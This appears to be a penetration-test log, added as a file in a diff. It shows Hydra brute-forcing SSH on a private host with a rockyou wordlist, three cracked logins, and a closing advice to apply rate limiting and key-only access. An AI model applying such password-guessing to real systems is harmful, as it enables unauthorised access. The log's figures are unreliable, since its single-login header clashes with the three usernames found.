@@ -1,0 +1,30 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-10 05:32:11
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.20.45:22/
+[STATUS] 186.00 tries/min, 186 tries in 00:01h, 14344213 to do in 1285:30h, 16 active
+[STATUS] 178.33 tries/min, 535 tries in 00:03h, 14343864 to do in 1342:07h, 16 active
+[STATUS] 175.57 tries/min, 1229 tries in 00:07h, 14343170 to do in 1361:05h, 16 active
+[STATUS] 177.67 tries/min, 2666 tries in 00:15h, 14341733 to do in 1345:11h, 16 active
+[22][ssh] host: 192.168.20.45   login: admin   password: admin123
+[22][ssh] host: 192.168.20.45   login: administrator   password: Password1
+[22][ssh] host: 192.168.20.45   login: backup   password: backup2024
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-10 06:01:44
+
+--- SUMMARY ---
+Target:    ssh://192.168.20.45:22
+Wordlist:  /usr/share/wordlists/rockyou.txt
+Results:   3 valid credentials found
+Time:      00:29:33
+Attempts:  3127
+
+CREDENTIALS FOUND:
+  [1] admin : admin123
+  [2] administrator : Password1
+  [3] backup : backup2024
+
+RECOMMENDATION: Apply Fail2Ban rate limiting and enforce SSH key-only authentication.
+                Rotate all discovered credentials immediately.
